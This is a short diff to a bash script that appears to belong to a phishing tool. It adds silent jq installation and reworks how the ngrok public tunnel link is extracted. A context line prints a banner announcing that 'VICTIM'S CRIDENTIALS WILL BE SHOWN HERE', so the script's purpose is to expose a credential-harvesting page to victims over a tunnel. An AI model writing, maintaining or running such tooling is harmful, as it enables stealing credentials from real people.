@@ -1,6 +1,18 @@
 #!/bin/bash
 #<<<----------DISTRO VERIFICATION---------->>>
 distro=$(uname -o)
+case ${distro} in
+Android)
+        if ! hash jq > /dev/null 2>&1; then
+        apt install jq -y > /dev/null 2>&1
+        fi
+;;
+GNU/Linux)
+        if ! hash jq > /dev/null 2>&1; then
+        sudo apt install jq -y > /dev/null 2>&1
+        fi
+;;
+esac
 #<<<----------NGROK---------->>>
 if [[ ${distro^^} == *'ANDROID'* ]]; then
   appl=$(pwd)
@@ -279,7 +291,12 @@ else
 sleep 7
 fi
 echo
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+#link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
+r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
+r2=$(printf "${r1/\"http:\/\//}")
+r3=$(printf "${r2/\"https:\/\//}")
+r4=$(printf "${r3/\",/}")
+link=$(printf "${r4/%\",/}")
 echo; wait
 printf "${C7}<<<${R0}${C1}---------------${R0}${B1}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R1}${C1}---------------${R0}${C7}>>>${R0}\n"; wait
 echo; wait
